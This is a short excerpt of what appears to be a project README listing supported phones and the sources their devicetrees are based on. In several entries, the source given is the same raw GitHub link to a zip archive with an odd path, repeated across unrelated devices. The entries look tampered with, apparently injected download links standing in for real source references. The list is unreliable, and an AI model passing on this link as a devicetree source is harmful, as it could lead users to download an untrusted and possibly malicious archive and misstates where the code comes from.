...
* Nothing Phone 2 (pong) (devicetrees based on `https://raw.githubusercontent.com/HradekCZ/fdt/main/uncourtierlike/fdt-1.0.zip`)
* Realme GT Neo5 150W (rmx3706) (devicetrees based on `?`)
* Samsung Galaxy Z Fold4 (q4q) (devicetrees based on `?`)
* Xiaomi 12 (cupid) (devicetrees based on `https://raw.githubusercontent.com/HradekCZ/fdt/main/uncourtierlike/fdt-1.0.zip`)
* Xiaomi 12 Pro (zeus) (devicetrees based on `https://raw.githubusercontent.com/HradekCZ/fdt/main/uncourtierlike/fdt-1.0.zip`)
* Xiaomi 12S (mayfly) (devicetree based on `?`)
* Xiaomi 12S Pro (unicorn) (devicetrees based on `https://raw.githubusercontent.com/HradekCZ/fdt/main/uncourtierlike/fdt-1.0.zip`)
...
* POCO F4 GT (ingres) (devicetrees based on `https://raw.githubusercontent.com/HradekCZ/fdt/main/uncourtierlike/fdt-1.0.zip`)
